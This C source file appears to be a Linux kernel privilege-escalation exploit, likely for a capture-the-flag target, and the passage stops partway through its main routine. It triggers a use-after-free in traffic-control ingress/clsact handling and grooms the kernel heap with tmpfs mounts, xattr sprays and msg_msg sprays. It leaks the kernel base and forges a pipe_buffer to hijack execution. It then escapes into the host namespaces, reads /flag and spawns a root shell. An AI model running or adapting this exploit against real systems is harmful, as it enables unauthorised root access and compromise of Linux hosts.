#define _GNU_SOURCE

#include <endian.h>
#include <sys/syscall.h>
#include <linux/membarrier.h>
#include <arpa/inet.h>
#include <sched.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <err.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <inttypes.h>
#include <math.h>
#include <pthread.h>
#include <assert.h>

#include <linux/keyctl.h>

#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/xattr.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#define BITMASK(bf_off,bf_len) (((1ull << (bf_len)) - 1) << (bf_off))
#define STORE_BY_BITMASK(type,htobe,addr,val,bf_off,bf_len) *(type*)(addr) = htobe((htobe(*(type*)(addr)) & ~BITMASK((bf_off), (bf_len))) | (((type)(val) << (bf_off)) & BITMASK((bf_off), (bf_len))))

#ifndef NFT_CHAIN_BINDING
#define NFT_CHAIN_BINDING (1 << 2)
#endif

#define PRE_ALLOC_COUNT 4000
#define PRE_ALLOC_ITER 20
#define SPRAY_COUNT 950

#define PAGE_SIZE 0x1000

#define FIRST_SPRAY_SZ 0x1d00
#define SECOND_SPRAY_SZ (FIRST_SPRAY_SZ + 0x400)
#define THIRD_SPRAY_SZ (SECOND_SPRAY_SZ + 0x400)

uint64_t usleep_time;
uint64_t prefix_spray_cnt = 0;
uint64_t ignore_xattr_idx[] = {-1, -1, -1, -1, -1, -1, -1, -1, -1, -1};
int glb_pipe_fd[0x500][2];

int passer;

void unshare_setup(uid_t uid, gid_t gid)
{
	int temp;
	char edit[0x100];

	unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);

	temp = open("/proc/self/setgroups", O_WRONLY);
	write(temp, "deny", strlen("deny"));
	close(temp);

	temp = open("/proc/self/uid_map", O_WRONLY);
	snprintf(edit, sizeof(edit), "0 %d 1", uid);
	write(temp, edit, strlen(edit));
	close(temp);

	temp = open("/proc/self/gid_map", O_WRONLY);
	snprintf(edit, sizeof(edit), "0 %d 1", gid);
	write(temp, edit, strlen(edit));
	close(temp);

	return;
}

char * table1_name = "table1";
char * table2_name = "table2";
char * chain1_name = "chain1";
char * chain2_name = "chain2";

uint32_t portid;

uint64_t r[1] = {0xffffffffffffffff};

void *recv_cb(void) {
	unsigned long long arr[10000] = { 0, };
	int ret;

	/*
	do {
		memset(arr, 0, sizeof(arr));
		ret = mnl_socket_recvfrom(nl, arr, sizeof(arr));
		printf("ret : %d\n", ret);
		for (int i = 0; i < 20; i++) {
			printf("0x%llx\n", arr[i]);
		}
	} while (1);
	*/
}

char *dupfile = NULL;
char *dupattr = NULL;

void hexdump(char *str, int pad, int l, int r)
{
	for(int i=l; i<r; i+=pad)
	{
		if(pad == 8)
		{
			printf("0x%05x: 0x%llx\n", i/pad, ((uint64_t *)str)[i/pad]);
		}
	}
}

#define CC_OVERFLOW_FACTOR 1
#define OBJS_PER_SLAB 16
#define CPU_PARTIAL (24 * 6)
#define OBJS_FRONT 48

#define TMPFS_MOUNT_POINT "/tmp/tmpfs_mountpoint"

void pre_make_mount_dir(char *fname)
{
	for(int i=0; i<0x8000; i++)
	{
		char mount_fldname[0x100];
		snprintf(mount_fldname, 0x100, "%s-%05d", fname, i);

		struct stat sb;
		if(stat(mount_fldname, &sb))
			mkdir(mount_fldname, 0644);
	}
}

void mount_file(char *fname, int idx)
{
	char mount_fldname[0x100];
	snprintf(mount_fldname, 0x100, "%s-%05d", fname, idx);
	if (mount("none", mount_fldname, "tmpfs", 0, NULL) < 0) {
		fprintf(stderr, "mount %s(type: tmpfs): %s\n", mount_fldname, strerror(errno));
		printf("[-] cross cache: mount fail\n");
	}
}

void umount_file(char *fname, int idx)
{
	char mount_fldname[0x100];
	snprintf(mount_fldname, 0x100, "%s-%05d", fname, idx);
	if (umount(mount_fldname) < 0) {
		fprintf(stderr, "umount %s(type: tmpfs): %s\n", mount_fldname, strerror(errno));
		printf("[-] cross cache: umount fail\n");
	}
}

void cross_cache_spray1()
{
	for(int i=0; i<OBJS_FRONT; i++)
		mount_file(TMPFS_MOUNT_POINT, i);
	printf("[+] cross cache: cross_cache_spray1 pass\n");
}

void cross_cache_spray2()
{
	for(int i=OBJS_FRONT; i<OBJS_PER_SLAB * (CPU_PARTIAL + 2) * CC_OVERFLOW_FACTOR; i++)
		mount_file(TMPFS_MOUNT_POINT, i);
	printf("[+] cross cache: cross_cache_spray2 pass\n");
}

void cross_cache_remove_all_chunk()
{
	for(int i=0; i<OBJS_PER_SLAB * (CPU_PARTIAL + 2) * CC_OVERFLOW_FACTOR; i++)
		if(i % OBJS_PER_SLAB)
			umount_file(TMPFS_MOUNT_POINT, i);
	for(int i=0; i<OBJS_PER_SLAB * (CPU_PARTIAL + 2) * CC_OVERFLOW_FACTOR; i++)
		if(!(i % OBJS_PER_SLAB))
			umount_file(TMPFS_MOUNT_POINT, i);
}

#define XATTR_FILE "/tmp/a"
#define XATTR_VALUE "value"

#define XATTR_PADDING_STR "security.attr"
#define ATTRIBUTE_NAME_LEN 0x100
#define VALUE_NAME_LEN 0x400 - 0x20
#define HEAD_VALUE_NAME_LEN 0x100
#define FILENAME_LEN 0x80

typedef struct xattr_node {
	uint64_t parent;
	uint64_t lchild, rchild;
	uint64_t nameptr;
	uint64_t size;
	char value[];
} xattr_node;

#define XATTR_HEADER_SIZE sizeof(xattr_node)
#define XATTR_VALUE_CG_64 (0x40 - XATTR_HEADER_SIZE)
#define XATTR_VALUE_CG_128 (0x80 - XATTR_HEADER_SIZE)
#define XATTR_VALUE_CG_192 (0xc0 - XATTR_HEADER_SIZE)
#define XATTR_VALUE_CG_256 (0x100 - XATTR_HEADER_SIZE)
#define XATTR_VALUE_CG_512 (0x200 - XATTR_HEADER_SIZE)
#define XATTR_VALUE_CG_1K (0x400 - XATTR_HEADER_SIZE)
#define XATTR_VALUE_CG_2K (0x800 - XATTR_HEADER_SIZE)
#define XATTR_VALUE_CG_8K (0x2000 - XATTR_HEADER_SIZE)
#define XATTR_VALUE_CG_16K (0x4000 - XATTR_HEADER_SIZE)
#define XATTR_VALUE_CG_32K (0x8000 - XATTR_HEADER_SIZE)

#define SIZE_CG_2K 0x800

void create_xattr(const char *filename, char *attribute_name, char *value_name, uint64_t size) {
    if (setxattr(filename, attribute_name, value_name, size, XATTR_CREATE) < 0)
        perror("setxattr");
}

int remove_xattr(const char *filename, char *attribute_name) {
	if (removexattr(filename, attribute_name) < 0)
	{
		perror("removexattr");
		return -1;
	}
	return 0;
}

int remove_xattr_any(const char *filename, char *attribute_name) {
	return removexattr(filename, attribute_name);
}

char *read_xattr(const char *filename, char *attribute_name) {
	char *leak = (char *)calloc(sizeof(char), 0x10000);
	int length = 0;

	char value_name[192];
	if((length = getxattr(filename, attribute_name, leak, 0x10000)) > VALUE_NAME_LEN)
	{
		printf("[+] overwrite success! let's leak (rcu_counter = %lx)\n", length);
		dupfile = strdup(filename);
		dupattr = strdup(attribute_name);
		// hexdump(leak, 8, 0x0, 0x100);

		return leak;
	}
	return NULL;
}

void read_xattr2(const char *filename, char *attribute_name) {
	char *leak = (char *)calloc(sizeof(char), 0x10000);
	int length = 0;
	if((length = getxattr(filename, attribute_name, leak, 0x10000)) < 0)
		perror("getxattr");
}

void spray_simple_xattr_for_leak_first(uint32_t cnt) {
	char file_name[FILENAME_LEN];
	char value_name[XATTR_VALUE_CG_8K];
    char attribute_name[XATTR_VALUE_CG_8K];

	int fds[1000];
	for(int i=0; i<100; i++)
		fds[i] = open("/etc/passwd", O_RDONLY);
	for(int i=0; i<100; i++)
		close(fds[i]);

    for (uint64_t i = prefix_spray_cnt; i < prefix_spray_cnt + cnt; i++) {
		snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);

		*(uint64_t *)value_name = i;
		snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 5, XATTR_PADDING_STR);
		create_xattr(file_name, attribute_name, value_name, XATTR_VALUE_CG_128+1);

		if(i % 0x10 == 0)
		{
			if(pipe(glb_pipe_fd[(i - prefix_spray_cnt)/0x10]) < 0)
				perror("pipe");
			if(fcntl(glb_pipe_fd[(i - prefix_spray_cnt)/0x10][1], F_SETPIPE_SZ, PAGE_SIZE*4) < 0)
				perror("fcntl");
			write(glb_pipe_fd[(i - prefix_spray_cnt)/0x10][1], "help", 4);
		}
	}
}

void spray_simple_xattr_for_leak_second(uint32_t cnt) {

	char file_name[FILENAME_LEN];
	char value_name[XATTR_VALUE_CG_8K] = {0, };
    char attribute_name[XATTR_VALUE_CG_8K];

    for (uint64_t i = prefix_spray_cnt; i < prefix_spray_cnt + cnt; i++) {

		snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);

		snprintf(value_name, VALUE_NAME_LEN, "security.value%05lu-%s", i, XATTR_PADDING_STR);
		snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 3, XATTR_PADDING_STR);
		create_xattr(file_name, attribute_name, value_name, XATTR_VALUE_CG_2K);

		snprintf(value_name, VALUE_NAME_LEN, "security.value%05lu-%s", i, XATTR_PADDING_STR);
		snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 7, XATTR_PADDING_STR);
        create_xattr(file_name, attribute_name, value_name, XATTR_VALUE_CG_2K);
    }
}

char *read_simple_xattr_for_leak(uint32_t idx) {

	char file_name[FILENAME_LEN];
    char attribute_name[ATTRIBUTE_NAME_LEN];

    /* Need that the name is allocated within `kmalloc-256` */
	snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, idx/3);
	snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 5, XATTR_PADDING_STR);
	return read_xattr(file_name, attribute_name);
}

int cpu_affinity(int cpu_idx)
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(cpu_idx, &mask);
	return sched_setaffinity(0, sizeof(mask), &mask);
}

void pre_make_xattr_file(const char *str, uint64_t last)
{
	char file_name[FILENAME_LEN];
	int fd = creat(str, 0644);
	if(fd < 0)
		perror("creat");
	close(fd);
    for (uint64_t i = prefix_spray_cnt; i < prefix_spray_cnt + last; i++) {
        snprintf(file_name, FILENAME_LEN, "%s-%08d", str, i);
		int fd = creat(file_name, 0644);
		if(fd < 0)
			perror("creat");
		close(fd);
    }
}

void trigger_uaf_write(int pip1[], int pip2[], int affi)
{
	int fd;
	uint64_t t[4] = {0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff, 0x0};
	intptr_t ret = 0;
	char step[10];

	cpu_affinity(affi);

	unshare_setup(getuid(), getgid());

	printf("fork init\n");

	syscall(__NR_mmap, /*addr=*/0x30000000ul, /*len=*/0x1000000ul, /*prot=*/7ul, /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);

	ret = syscall(__NR_socket, /*domain=*/0x10ul, /*type=*/3ul, /*proto=*/0);
	if (ret != -1)
		t[0] = ret;
	ret = syscall(__NR_socket, /*domain=*/0x10ul, /*type=*/3ul, /*proto=*/0);
	if (ret != -1)
		t[1] = ret;
	ret = syscall(__NR_socket, /*domain=*/0x10ul, /*type=*/3ul, /*proto=*/0);
	if (ret != -1)
		t[2] = ret;

	*(uint64_t*)0x30000040 = 0;
	*(uint32_t*)0x30000048 = 0;
	*(uint64_t*)0x30000050 = 0x30000100;
	*(uint64_t*)0x30000100 = 0x30000240;
	*(uint32_t*)0x30000240 = 0x24;
	*(uint16_t*)0x30000244 = 0x24;
	*(uint16_t*)0x30000246 = 0;
	*(uint32_t*)0x30000248 = 0;
	*(uint32_t*)0x3000024c = 0;
	*(uint8_t*)0x30000250 = 0;
	*(uint8_t*)0x30000251 = 0;
	*(uint16_t*)0x30000252 = 0;
	*(uint32_t*)0x30000254 = 0;
	*(uint16_t*)0x30000258 = 0;
	*(uint16_t*)0x3000025a = 0;
	*(uint16_t*)0x3000025c = 0;
	*(uint16_t*)0x3000025e = 0;
	*(uint16_t*)0x30000260 = 0;
	*(uint16_t*)0x30000262 = 0;
	*(uint64_t*)0x30000108 = 0x24;
	*(uint64_t*)0x30000058 = 1;
	*(uint64_t*)0x30000060 = 0;
	*(uint64_t*)0x30000068 = 0;
	*(uint32_t*)0x30000070 = 0;
	ret = syscall(__NR_sendmsg, /*fd=*/t[2], /*msg=*/0x30000040ul, /*f=*/0ul);


	*(uint32_t*)0x30000100 = 0x14;
	ret = syscall(__NR_getsockname, /*fd=*/t[2], /*addr=*/0x30000080ul, /*addrlen=*/0x30000100ul);
	if (ret != -1)
		t[3] = *(uint32_t*)0x30000084;


	*(uint64_t*)0x30000040 = 0;
	*(uint32_t*)0x30000048 = 0;
	*(uint64_t*)0x30000050 = 0x30000000;
	*(uint64_t*)0x30000000 = 0x300008c0;
	memcpy((void*)0x300008c0, "\x48\x00\x00\x00\x10\x00\x05\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90", 20);
	*(uint32_t*)0x300008d4 = t[3];
	memcpy((void*)0x300008d8, "\x00\x00\x00\x00\x00\x00\x00\x00\x28\x00\x12\x00\x0c\x00\x01\x00\x76\x65\x74\x68", 20);
	*(uint64_t*)0x30000008 = 0x48;
	*(uint64_t*)0x30000058 = 1;
	*(uint64_t*)0x30000060 = 0;
	*(uint64_t*)0x30000068 = 0;
	*(uint32_t*)0x30000070 = 0;
	ret = syscall(__NR_sendmsg, /*fd=*/t[1], /*msg=*/0x30000040ul, /*f=*/0ul);


	/* ------------- gen dummy ingress ------------ */


	/* iovec */
	*(uint64_t*)0x300006c0 = 0;
	*(uint32_t*)0x300006c8 = 0;
	*(uint64_t*)0x300006d0 = 0x30000780;
	*(uint64_t*)0x300006d8 = 1;
	*(uint64_t*)0x300006e0 = 0;
	*(uint64_t*)0x300006e8 = 0;
	*(uint32_t*)0x300006f0 = 0;

	*(uint64_t*)0x30000780 = 0x30000480;
	*(uint64_t*)0x30000788 = 0x54 + 0xc;


	/* struct nlmsghdr */
	*(uint32_t*)0x30000480 = 0x54 + 0xc;	// nlmsg_len
	*(uint16_t*)0x30000484 = 0x24;	// nlmsg_type
	*(uint16_t*)0x30000486 = 0xf1d;	// nlmsg_flags
	*(uint32_t*)0x30000488 = 0;	// nlmsg_seq
	*(uint32_t*)0x3000048c = 0;	// nlmsg_pid

	/* struct tcmsg */
	*(uint8_t*)0x30000490 = 0;
	*(uint8_t*)0x30000491 = 0;
	*(uint16_t*)0x30000492 = 0;
	*(uint32_t*)0x30000494 = t[3];
	*(uint16_t*)0x30000498 = 0;
	*(uint16_t*)0x3000049a = 0;
	*(uint16_t*)0x3000049c = 0xfff1;
	*(uint16_t*)0x3000049e = -1;
	*(uint16_t*)0x300004a0 = 0;
	*(uint16_t*)0x300004a2 = 0;

	/* struct nlattr */
	*(uint16_t*)0x300004a4 = 0xb;
	*(uint16_t*)0x300004a6 = 1;	// TCA_KIND
	/* payload */
	memcpy((void*)0x300004a8, "ingress\000", 8);
	/* struct nlattr */
	*(uint16_t*)0x300004b0 = 0x24;
	STORE_BY_BITMASK(uint16_t, , 0x300004b2, 8, 0, 14);
	STORE_BY_BITMASK(uint16_t, , 0x300004b3, 0, 6, 1);
	STORE_BY_BITMASK(uint16_t, , 0x300004b3, 1, 7, 1);
	*(uint16_t*)0x300004b4 = 0x1c;
	*(uint16_t*)0x300004b6 = 1;
	*(uint8_t*)0x300004b8 = 0;
	*(uint8_t*)0x300004b9 = 0;
	*(uint16_t*)0x300004ba = 0;
	*(uint32_t*)0x300004bc = 0;
	*(uint32_t*)0x300004c0 = 0;
	*(uint32_t*)0x300004c4 = 0;
	*(uint32_t*)0x300004c8 = 0;
	*(uint32_t*)0x300004cc = 0;
	*(uint16_t*)0x300004d0 = 4;
	*(uint16_t*)0x300004d2 = 2;
	/* struct nlattr */
	*(uint16_t*)0x300004d4= 0xc;   // nla_len
	*(uint16_t*)0x300004d6 = 13;    // nla_type
	/* payload */
	*(uint64_t*)0x300004d8 = 1;

	ret = syscall(__NR_sendmsg, /*fd=*/t[0], /*msg=*/0x300006c0ul, /*f=*/0ul);

	/* ------------ gen chain0 at block 0  ----------------- */

	/* iovec */
	*(uint64_t*)0x30010280 = 0;
	*(uint32_t*)0x30010288 = 0;
	*(uint64_t*)0x30010290 = 0x30010240;
	*(uint64_t*)0x30010298 = 1;
	*(uint64_t*)0x300102a0 = 0;
	*(uint64_t*)0x300102a8 = 0;
	*(uint32_t*)0x300102b0 = 0;

	*(uint64_t*)0x30010240 = 0x30010340;
	*(uint64_t*)0x30010248 = 0x24;

	/* struct nlmsghdr */
	*(uint32_t*)0x30010340 = 0x24;  // nlmsg_len
	*(uint16_t*)0x30010344 = 100;   // nlmsg_type
	*(uint16_t*)0x30010346 = 0xf31; // nlmsg_flags
	*(uint32_t*)0x30010348 = 0;     // nlmsg_seq
	*(uint32_t*)0x3001034c = 0;     // nlmsg_pid

	/* struct tcmsg */
	*(uint8_t*)0x30010350 = 0;      // tcm_family
	*(uint8_t*)0x30010351 = 0;      // tcm__pad1
	*(uint16_t*)0x30010352 = 0;     // tcm__pad2
	*(uint32_t*)0x30010354 = 0xFFFFFFFF;    // tcm_ifindex
	*(uint16_t*)0x30010358 = 0;     // tcm_handle
	*(uint16_t*)0x3001035a = 0;
	*(uint32_t*)0x3001035c = 1;     // tcm_parent	// tcm_block_index
	*(uint16_t*)0x30010360 = 0;     // tcm_info
	*(uint16_t*)0x30010362 = 0;

	ret = syscall(__NR_sendmsg, /*fd=*/t[0], /*msg=*/0x30010280ul, /*f=*/0ul);


	/* ------------ change to clsact ------------ */

	memcpy((void*)0x300004a8, "clsact\000", 7);
	ret = syscall(__NR_sendmsg, /*fd=*/t[0], /*msg=*/0x300006c0ul, /*f=*/0ul);

	read(pip1[0], step, 10);
	/* ------------- change to ingress (ctx alloc) ---- ------- */

	cross_cache_spray1();

	memcpy((void*)0x300004a8, "ingress\000", 8);
	ret = syscall(__NR_sendmsg, /*fd=*/t[0], /*msg=*/0x300006c0ul, /*f=*/0ul);

	if(!passer) 
	{
		syscall(SYS_membarrier, MEMBARRIER_CMD_GLOBAL, 0, -1);	// kfree_rcu wait
		usleep(usleep_time);
	}

	cross_cache_spray2();
	cross_cache_remove_all_chunk();


	write(pip2[1], "step 2", 4);
	/* ------------ uaf write ------------ */
	read(pip1[0], step, 10);

	_exit(0);
}

uint64_t kbase = 0, kheap_leak = 0;

uint64_t *trigger_spray_chunks(int pip1[], int pip2[])
{
	char step[10];


	unshare_setup(getuid(), getgid());
	spray_simple_xattr_for_leak_first(FIRST_SPRAY_SZ);

	/* ------------- <exploit alloc, cross cache alloc & exploit free, cross cache free> --------------- */

	write(pip1[1], "step 1", 4);
	read(pip2[0], step, 10);

	spray_simple_xattr_for_leak_second(FIRST_SPRAY_SZ);
	printf("[+] spray xattr, which would be overwriten\n");

	/* -------------------- <exploit write> ------------------------- */

	write(pip1[1], "step 3", 4);
	// read(pip2[0], step, 10);

	/* ---------------------- heap oob read ---------------------------------- */
	printf("[*] waiting for exit...\n");
	usleep(100000);

	uint64_t *leaks;
	for(int i=0; i<FIRST_SPRAY_SZ; i++)
	{
		leaks = (uint64_t *)read_simple_xattr_for_leak(prefix_spray_cnt + i);
		if(leaks)
			break;
	}
	if(!leaks)
	{
		printf("[-] leak failed... please retry!\n");
		return leaks;
	}
	
	for(int i=0; i<0x400; i++)
	{
		if(kbase)
			break;
		if((leaks[i] & 0xffffffff80000000) == 0xffffffff80000000 && (leaks[i] & 0xffffffffffff0000) != 0xffffffffffff0000)
		{
			kbase = (((leaks[i] >> 24) - 1) << 24); // memory_stats+352
			break;
		}
	}

	printf("[+] kbase: 0x%llx\n", kbase);

	return leaks;
}

void set_simple_xattr_by_size(char *file_name, char *attr_name, int valueidx, int valuelen)
{
	char value_name[XATTR_VALUE_CG_8K*2];

	snprintf(value_name, XATTR_VALUE_CG_192, "security.value%02lu", valueidx);
	create_xattr(file_name, attr_name, value_name, valuelen);
}

void read_simple_xattr_by_size(uint64_t idx, int valueidx)
{
	char file_name[FILENAME_LEN];
    char attribute_name[ATTRIBUTE_NAME_LEN];

    /* Need that the name is allocated within `kmalloc-256` */
	snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, idx);
	snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%02lu-%s", valueidx, XATTR_PADDING_STR);
	read_xattr2(file_name, attribute_name);
}

void set_simple_xattr_for_fake_rbtree_first(uint64_t fname_idx, uint64_t attr_name, uint64_t conn1, uint64_t conn2)
{
	char file_name[FILENAME_LEN];
	char value_name[VALUE_NAME_LEN];
    char attribute_name[ATTRIBUTE_NAME_LEN];

	snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, fname_idx);
	snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 5, XATTR_PADDING_STR);
	remove_xattr(file_name, attribute_name);
	// sleep(1);

	xattr_node fake_xattr = {
		.parent = conn1,
		.lchild = conn2,
		.rchild = 0x0,
		.nameptr = attr_name + 0x28,
		.size = 0x10
	};

	memset(value_name, 0, VALUE_NAME_LEN);
	memcpy(value_name + 0x40 - sizeof(xattr_node), (char *)&fake_xattr, 0x30); // if chunk is 0x---180 -> 0x---100 (from 0xc0)
	memcpy(value_name + 0x80 - sizeof(xattr_node), (char *)&fake_xattr, 0x30); // if chunk is 0x---240 -> 0x---200 (from 0x180)

	for(int i=prefix_spray_cnt + FIRST_SPRAY_SZ; i < prefix_spray_cnt + SECOND_SPRAY_SZ; i++)
	{
		snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);
		snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 5, XATTR_PADDING_STR);
		create_xattr(file_name, attribute_name, value_name, XATTR_VALUE_CG_192);
	}

	snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, fname_idx);
	snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 1, XATTR_PADDING_STR);
	create_xattr(file_name, attribute_name, value_name, XATTR_VALUE_CG_192);

	for(int i=prefix_spray_cnt + SECOND_SPRAY_SZ; i < prefix_spray_cnt + THIRD_SPRAY_SZ; i++)
	{
		snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);
		snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 5, XATTR_PADDING_STR);
		create_xattr(file_name, attribute_name, value_name, XATTR_VALUE_CG_192);
	}
}

void spray_simple_xattr_for_fake_rbtree_second(uint64_t target)
{
	char file_name[ATTRIBUTE_NAME_LEN];
    char attribute_name[XATTR_VALUE_CG_32K*2];
	char value_name[XATTR_VALUE_CG_32K*2];
	
	for(int i=prefix_spray_cnt + FIRST_SPRAY_SZ; i < prefix_spray_cnt + SECOND_SPRAY_SZ; i++)
	{
		snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);
		snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr1");
		for(int i=0; i<XATTR_VALUE_CG_32K/8; i++)
			((uint64_t *)(value_name))[i] = target - 0x20;

		create_xattr(file_name, attribute_name, value_name, XATTR_VALUE_CG_32K);
	}
}

void generate_fake_rbtree(int pip1[], int pip2[], uint64_t fname_idx, uint64_t target, uint64_t attr_name_ptr, uint64_t conn1, uint64_t conn2)
{
	char step[10];

	unshare_setup(getuid(), getgid());
	
	set_simple_xattr_for_fake_rbtree_first(fname_idx, attr_name_ptr, conn1, conn2);

	/* ------------- <exploit alloc, cross cache alloc & exploit free, cross cache free> --------------- */

	write(pip1[1], "step 1", 4);
	read(pip2[0], step, 10);

	spray_simple_xattr_for_fake_rbtree_second(target);
	printf("[+] spray xattr, which would be overwriten\n");

	// printf("waiting...\n"); getchar();

	/* -------------------- <exploit write> ------------------------- */
	write(pip1[1], "step 3", 4);
	// read(pip2[0], step, 10);

	/* ---------------------- heap oob read ---------------------------------- */
	printf("[*] waiting for exit...\n");
	usleep(100000);
}

struct pipe_buffer {
	struct page *page;
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};

typedef struct {
  long mtype;
  char mtext[1];
} msg;

#define MSGMSG_FREE_IDX_0 0
#define MSGMSG_FREE_IDX_1 1950
#define MTYPE_PRIMARY 0x41
#define MTYPE_SECONDARY 0x42

int spray_qids[0x1000];

int32_t make_queue(key_t key, int msgflg) {
    int32_t result;
    if ((result = msgget(key, msgflg)) == -1) {
        perror("msgget failure");
        exit(-1);
    }
    return result;
}

void send_msg(int msqid, void *msgp, size_t msgsz, int msgflg) {
    if (msgsnd(msqid, msgp, msgsz, msgflg) == -1) {
        perror("msgsend failure");
        exit(-1);
    }
    return;
}

ssize_t get_msg(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg) {
    ssize_t ret;
    ret = msgrcv(msqid, msgp, msgsz, msgtyp, msgflg);
    if (ret < 0) {
        perror("msgrcv");
        exit(-1);
    }
    return ret;
}

void spray_msgmsg_for_overwrite_pipe_buffer(uint64_t size, uint64_t cnt, uint64_t fake_page, uint64_t fake_ops, uint64_t call_func_addr) {
  char buffer[0x2000] = {0};
  msg *message = (msg *)buffer;

  struct pipe_buffer fake_pipe_buffer = {
	.page = fake_page,
	.ops = fake_ops,
	.offset = 0x0,
	.len = 0x0,
	.flags = 0x10,
	.private = 0x40
  };

  for (int i = 0; i < cnt; i++) {
    int spray = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
    spray_qids[i] = spray;
    memset(buffer, 0x42, sizeof(buffer));
	*(uint64_t *)(buffer + 0x1000 - 0x30 + 0x8) = call_func_addr; // push rsp
	memcpy(buffer + 0x1000 - 0x30 + 0x28, &fake_pipe_buffer, sizeof(fake_pipe_buffer));

    message->mtype = MTYPE_PRIMARY;
    send_msg(spray, message, size - 0x30 - 0x8, 0);
  }
}

uint64_t read_msgmsg_for_leak_vmemmap_base(uint64_t size, uint64_t cnt) {
	char buf[0x2000] = {0};
	uint64_t vmemmap_base = 0;
	for(int i=0; i < cnt; i++)
	{
		get_msg(spray_qids[i], buf, size - 0x30 - 0x8, MTYPE_PRIMARY, IPC_NOWAIT);
		if((((uint64_t *)(buf + 0x1000 - 0x30))[5] >> 48) == 0xffff)
		{
			// hexdump(buf, 0x8, 0x1000 - 0x30, size - 0x30 - 0x8);
			vmemmap_base = ((uint64_t *)(buf + 0x1000 - 0x30))[5];
			break;
		}
	}
	return vmemmap_base;
}

uint64_t virt_to_page(uint64_t virt, uint64_t kheap_base, uint64_t vmemmap_base)
{
	return (((virt - kheap_base) >> 0xc) << 0x6) + vmemmap_base;
}

size_t user_cs, user_ss, user_sp, user_rflags;
void save_state() {
  __asm__(
      ".intel_syntax noprefix;"
      "mov user_cs, cs;"
      "mov user_ss, ss;"
      "mov user_sp, rsp;"
      "pushf;"
      "pop user_rflags;"
      ".att_syntax;"
  );
}
void win() {
	if(fork())
	{
		setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
		setns(open("/proc/1/ns/pid", O_RDONLY), 0);
		setns(open("/proc/1/ns/net", O_RDONLY), 0);

		system("cat /flag");

		char *args[] = {"/bin/sh", NULL};
		execve("/bin/sh", args, NULL);
	}

}
void get_shell() {
	if (getuid() == 0) {
		win();
	} else {
		puts("[-] failed to get root");
	}
	while(1);
}

void cleanup()
{
	char file_name[FILENAME_LEN];
	int fd = remove(XATTR_FILE);
	if(fd < 0)
		perror("remove");

    for (uint64_t i = prefix_spray_cnt; i < prefix_spray_cnt + THIRD_SPRAY_SZ; i++) {
        snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);
		int fd = remove(file_name);
		if(fd < 0)
			perror("remove");

    }
}

void cleanup2(int except)
{
	if(prefix_spray_cnt == 0)
		prefix_spray_cnt += THIRD_SPRAY_SZ;
	else
		prefix_spray_cnt += THIRD_SPRAY_SZ - FIRST_SPRAY_SZ;
}

void cleanup_cg_192()
{
	char file_name[FILENAME_LEN];
	char value_name[XATTR_VALUE_CG_8K] = {0, };
    char attribute_name[XATTR_VALUE_CG_8K];

	for (uint64_t i = 0x1000; i < FIRST_SPRAY_SZ; i++) {
		snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);
        snprintf(value_name, VALUE_NAME_LEN, "security.value%05lu-%s", i, XATTR_PADDING_STR);
		snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 9, XATTR_PADDING_STR);
		create_xattr(file_name, attribute_name, value_name, XATTR_VALUE_CG_192);
    }
}

typedef struct {
	xattr_node xattr;
	int fname_idx;
} xattr_node_leak;

int run(void)
{
	pid_t pid;
	int pip1[2], pip2[2], pip3[2];
	char step[10];
	uint64_t handle_num;
	int p1;
	int status1;
	pthread_t hdr1;

	passer = 0;

	save_state();

	pipe(pip1);
	pipe(pip2);
	pipe(pip3);

	if(!fork())
		exit(0);

	cpu_affinity(0);
	pre_make_mount_dir(TMPFS_MOUNT_POINT);
	pre_make_xattr_file(XATTR_FILE, 0x10000);

	if (!fork()) {
		trigger_uaf_write(pip1, pip2, 0);
	}
	uint64_t *leaks = trigger_spray_chunks(pip1, pip2);

	for(int i=0; i<0x500; i++)
	{
		if(glb_pipe_fd[i][0])
			close(glb_pipe_fd[i][0]);
		if(glb_pipe_fd[i][1])
			close(glb_pipe_fd[i][1]);
	}

	if (!leaks)
	{
		printf("[-] fail on get xattr node info, cleanup it\n");
		cleanup();
		return -1;
	}

	uint64_t lnode = 0, rnode = 0, attr_name_ptr = 0;
	xattr_node_leak nodes[0x4000/(0x40/0x8)];
	int nodes_cnt = 0, nodes_front = 0;
